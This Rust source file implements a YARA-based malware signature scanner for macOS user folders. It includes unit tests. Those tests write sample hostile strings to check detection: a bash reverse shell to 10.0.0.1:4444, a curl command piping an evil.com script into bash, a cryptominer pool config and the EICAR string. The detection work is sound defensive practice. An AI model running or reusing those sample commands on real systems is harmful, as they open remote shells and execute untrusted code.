use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use async_trait::async_trait;
use tracing::{debug, info, warn};
use walkdir::WalkDir;

use crate::finding::{Evidence, Finding, ModuleCategory, Reproduction, Severity};
use crate::modules::{ScanContext, ScanModule};

mod yara_rules_source {
    pub use super::super::yara_rules::*;
}

/// A finding produced by YARA rule matching.
pub struct YaraFinding {
    pub rule_name: String,
    pub severity: Severity,
    pub file_path: PathBuf,
    pub matched_strings: Vec<String>,
    pub description: String,
}

/// YARA-based file scanner using compiled rules from embedded sources.
pub struct YaraScanner {
    compiled_rules: yara_x::Rules,
}

impl YaraScanner {
    /// Compile the embedded YARA rule set and return a ready scanner.
    pub fn new() -> Result<Self> {
        let source = yara_rules_source::all_rules();
        let compiled_rules =
            yara_x::compile(source.as_str()).context("Failed to compile embedded YARA rules")?;
        info!("YARA scanner initialized with embedded rules");
        Ok(Self { compiled_rules })
    }

    /// Scan a single file and return any YARA findings.
    pub fn scan_file(&self, path: &Path) -> Result<Vec<YaraFinding>> {
        let data = match std::fs::read(path) {
            Ok(d) => d,
            Err(e) => {
                debug!("Skipping file {}: {}", path.display(), e);
                return Ok(Vec::new());
            }
        };

        let mut scanner = yara_x::Scanner::new(&self.compiled_rules);
        let scan_results = scanner
            .scan(&data)
            .context(format!("YARA scan failed for {}", path.display()))?;

        let mut findings = Vec::new();
        for matching_rule in scan_results.matching_rules() {
            let rule_name = matching_rule.identifier().to_string();
            let severity = extract_severity_from_metadata(&matching_rule);
            let description = extract_description_from_metadata(&matching_rule);

            let matched_strings: Vec<String> = matching_rule
                .patterns()
                .filter(|p| p.matches().len() > 0)
                .map(|p| p.identifier().to_string())
                .collect();

            findings.push(YaraFinding {
                rule_name,
                severity,
                file_path: path.to_path_buf(),
                matched_strings,
                description,
            });
        }

        Ok(findings)
    }

    /// Walk a directory tree and scan each file.
    pub fn scan_directory(&self, dir: &Path, recursive: bool) -> Result<Vec<YaraFinding>> {
        let mut all_findings = Vec::new();

        if !dir.exists() {
            debug!("Scan directory does not exist: {}", dir.display());
            return Ok(all_findings);
        }

        let walker = if recursive {
            WalkDir::new(dir).follow_links(false)
        } else {
            WalkDir::new(dir).max_depth(1).follow_links(false)
        };

        for entry in walker.into_iter().filter_map(|e| e.ok()) {
            let path = entry.path();
            if !path.is_file() {
                continue;
            }

            // Skip very large files (> 50 MB) to avoid memory issues
            if let Ok(meta) = path.metadata() {
                if meta.len() > 50 * 1024 * 1024 {
                    debug!(
                        "Skipping large file ({}MB): {}",
                        meta.len() / 1024 / 1024,
                        path.display()
                    );
                    continue;
                }
            }

            match self.scan_file(path) {
                Ok(findings) => {
                    if !findings.is_empty() {
                        warn!("YARA: {} match(es) in {}", findings.len(), path.display());
                    }
                    all_findings.extend(findings);
                }
                Err(e) => {
                    debug!("Error scanning {}: {}", path.display(), e);
                }
            }
        }

        Ok(all_findings)
    }
}

/// Extract severity from YARA rule metadata, defaulting to Medium.
fn extract_severity_from_metadata(rule: &yara_x::Rule<'_, '_>) -> Severity {
    for (key, value) in rule.metadata() {
        if key == "severity" {
            if let yara_x::MetaValue::String(s) = value {
                return match s.to_lowercase().as_str() {
                    "critical" => Severity::Critical,
                    "high" => Severity::High,
                    "medium" => Severity::Medium,
                    "low" => Severity::Low,
                    "info" => Severity::Info,
                    _ => Severity::Medium,
                };
            }
        }
    }
    Severity::Medium
}

/// Extract description from YARA rule metadata.
fn extract_description_from_metadata(rule: &yara_x::Rule<'_, '_>) -> String {
    for (key, value) in rule.metadata() {
        if key == "description" {
            if let yara_x::MetaValue::String(s) = value {
                return s.to_string();
            }
        }
    }
    format!("YARA rule {} matched", rule.identifier())
}

/// Convert a YARA severity to a CVSS-like score for the Finding.
fn severity_to_cvss(severity: &Severity) -> f64 {
    match severity {
        Severity::Critical => 9.5,
        Severity::High => 7.5,
        Severity::Medium => 5.0,
        Severity::Low => 3.0,
        Severity::Info => 1.0,
    }
}

/// Build remediation text based on the rule name and severity.
fn build_remediation(finding: &YaraFinding) -> String {
    match finding.severity {
        Severity::Critical => format!(
            "CRITICAL: YARA rule '{}' detected a known threat in '{}'. \
             Immediately quarantine this file, investigate its origin, \
             and scan the system for additional indicators of compromise.",
            finding.rule_name,
            finding.file_path.display()
        ),
        Severity::High => format!(
            "HIGH: YARA rule '{}' flagged '{}'. \
             Quarantine the file and investigate how it arrived on the system. \
             Check for persistence mechanisms and lateral movement.",
            finding.rule_name,
            finding.file_path.display()
        ),
        Severity::Medium => format!(
            "MEDIUM: YARA rule '{}' detected suspicious patterns in '{}'. \
             Review the file contents and determine if it is legitimate. \
             Remove if unauthorized.",
            finding.rule_name,
            finding.file_path.display()
        ),
        Severity::Low | Severity::Info => format!(
            "INFO: YARA rule '{}' matched in '{}'. \
             This may be a test file or benign match. Verify and dismiss if expected.",
            finding.rule_name,
            finding.file_path.display()
        ),
    }
}

/// Signature detection scan module using YARA rules.
#[derive(Default)]
pub struct SignatureDetectionModule;

impl SignatureDetectionModule {
    pub fn new() -> Self {
        Self
    }
}

#[async_trait]
impl ScanModule for SignatureDetectionModule {
    fn name(&self) -> &str {
        "signature-detection"
    }

    fn description(&self) -> &str {
        "YARA-based signature scanning for known malware, reverse shells, and suspicious patterns"
    }

    fn category(&self) -> ModuleCategory {
        ModuleCategory::SignatureDetection
    }

    async fn run(&self, _ctx: &mut ScanContext) -> Result<Vec<Finding>> {
        self.run_standalone().await
    }

    async fn run_standalone(&self) -> Result<Vec<Finding>> {
        let scanner = YaraScanner::new()?;

        // Default scan targets on macOS
        let home = dirs_home();
        let scan_targets: Vec<PathBuf> = vec![
            home.join("Library").join("LaunchAgents"),
            home.join("Library").join("LaunchDaemons"),
            home.join("Downloads"),
            home.join("Library").join("Application Support"),
        ];

        let mut all_findings = Vec::new();
        let mut finding_counter: u32 = 0;

        for target_dir in &scan_targets {
            info!("YARA scanning: {}", target_dir.display());
            match scanner.scan_directory(target_dir, true) {
                Ok(yara_findings) => {
                    for yf in yara_findings {
                        finding_counter += 1;
                        let fid =
                            format!("{}-{:03}", yf.severity.finding_id_prefix(), finding_counter);

                        all_findings.push(Finding {
                            id: fid,
                            title: format!(
                                "YARA: {} in {}",
                                yf.rule_name,
                                yf.file_path
                                    .file_name()
                                    .map(|n| n.to_string_lossy().to_string())
                                    .unwrap_or_else(|| yf.file_path.display().to_string())
                            ),
                            severity: yf.severity,
                            cvss: severity_to_cvss(&yf.severity),
                            category: ModuleCategory::SignatureDetection,
                            description: format!(
                                "{}\n\nFile: {}\nMatched strings: {}",
                                yf.description,
                                yf.file_path.display(),
                                if yf.matched_strings.is_empty() {
                                    "(none)".to_string()
                                } else {
                                    yf.matched_strings.join(", ")
                                }
                            ),
                            reproduction: Some(Reproduction {
                                method: format!("yara-scan {}", yf.file_path.display()),
                                tool: None,
                                arguments: None,
                            }),
                            evidence: Evidence {
                                messages: Vec::new(),
                                audit_record: None,
                                canary_detected: false,
                                os_events: Vec::new(),
                                files_modified: vec![yf.file_path.display().to_string()],
                                network_connections: Vec::new(),
                                stderr_output: None,
                            },
                            remediation: build_remediation(&yf),
                        });
                    }
                }
                Err(e) => {
                    debug!("Error scanning {}: {}", target_dir.display(), e);
                }
            }
        }

        info!(
            "YARA signature scan complete: {} finding(s)",
            all_findings.len()
        );
        Ok(all_findings)
    }
}

/// Get the user's home directory.
fn dirs_home() -> PathBuf {
    std::env::var("HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("/tmp"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_yara_scanner_compiles() {
        let scanner = YaraScanner::new();
        assert!(scanner.is_ok(), "YARA rules should compile without errors");
    }

    #[test]
    fn test_scan_eicar_test_file() {
        let scanner = YaraScanner::new().unwrap();
        let dir = tempfile::tempdir().unwrap();
        let eicar_path = dir.path().join("eicar.txt");
        let mut f = std::fs::File::create(&eicar_path).unwrap();
        f.write_all(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
            .unwrap();

        let findings = scanner.scan_file(&eicar_path).unwrap();
        assert!(!findings.is_empty(), "EICAR test file should be detected");
        assert_eq!(findings[0].rule_name, "EICAR_Test");
        assert_eq!(findings[0].severity, Severity::Info);
    }

    #[test]
    fn test_scan_clean_file() {
        let scanner = YaraScanner::new().unwrap();
        let dir = tempfile::tempdir().unwrap();
        let clean_path = dir.path().join("clean.txt");
        std::fs::write(&clean_path, b"Hello, this is a perfectly normal file.").unwrap();

        let findings = scanner.scan_file(&clean_path).unwrap();
        assert!(findings.is_empty(), "Clean file should produce no findings");
    }

    #[test]
    fn test_scan_directory_with_eicar() {
        let scanner = YaraScanner::new().unwrap();
        let dir = tempfile::tempdir().unwrap();

        // Create EICAR file in subdirectory
        let sub = dir.path().join("subdir");
        std::fs::create_dir(&sub).unwrap();
        std::fs::write(
            sub.join("malware.txt"),
            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
        )
        .unwrap();

        // Create clean file
        std::fs::write(dir.path().join("clean.txt"), b"safe content").unwrap();

        let findings = scanner.scan_directory(dir.path(), true).unwrap();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_name, "EICAR_Test");
    }

    #[test]
    fn test_scan_nonexistent_directory() {
        let scanner = YaraScanner::new().unwrap();
        let findings = scanner
            .scan_directory(Path::new("/nonexistent/path/12345"), true)
            .unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn test_scan_reverse_shell_detection() {
        let scanner = YaraScanner::new().unwrap();
        let dir = tempfile::tempdir().unwrap();
        let shell_path = dir.path().join("revshell.sh");
        std::fs::write(&shell_path, b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").unwrap();

        let findings = scanner.scan_file(&shell_path).unwrap();
        assert!(!findings.is_empty(), "Reverse shell should be detected");
        assert!(findings.iter().any(|f| f.rule_name == "Reverse_Shell_Bash"));
        assert_eq!(
            findings
                .iter()
                .find(|f| f.rule_name == "Reverse_Shell_Bash")
                .unwrap()
                .severity,
            Severity::Critical
        );
    }

    #[test]
    fn test_scan_curl_pipe_bash() {
        let scanner = YaraScanner::new().unwrap();
        let dir = tempfile::tempdir().unwrap();
        let script_path = dir.path().join("install.sh");
        std::fs::write(
            &script_path,
            b"#!/bin/bash\ncurl -s https://evil.com/payload.sh | bash\n",
        )
        .unwrap();

        let findings = scanner.scan_file(&script_path).unwrap();
        assert!(
            !findings.is_empty(),
            "Curl pipe bash pattern should be detected"
        );
    }

    #[test]
    fn test_module_trait_impl() {
        let module = SignatureDetectionModule::new();
        assert_eq!(module.name(), "signature-detection");
        assert_eq!(module.category(), ModuleCategory::SignatureDetection);
        assert!(!module.description().is_empty());
    }

    #[test]
    fn test_severity_to_cvss_mapping() {
        assert_eq!(severity_to_cvss(&Severity::Critical), 9.5);
        assert_eq!(severity_to_cvss(&Severity::High), 7.5);
        assert_eq!(severity_to_cvss(&Severity::Medium), 5.0);
        assert_eq!(severity_to_cvss(&Severity::Low), 3.0);
        assert_eq!(severity_to_cvss(&Severity::Info), 1.0);
    }

    #[test]
    fn test_scan_stratum_miner() {
        let scanner = YaraScanner::new().unwrap();
        let dir = tempfile::tempdir().unwrap();
        let miner_path = dir.path().join("config.json");
        std::fs::write(
            &miner_path,
            b"{\"pool\": \"stratum+tcp://pool.minexmr.com:4444\", \"wallet\": \"addr\"}",
        )
        .unwrap();

        let findings = scanner.scan_file(&miner_path).unwrap();
        assert!(
            !findings.is_empty(),
            "Cryptominer stratum config should be detected"
        );
    }
}
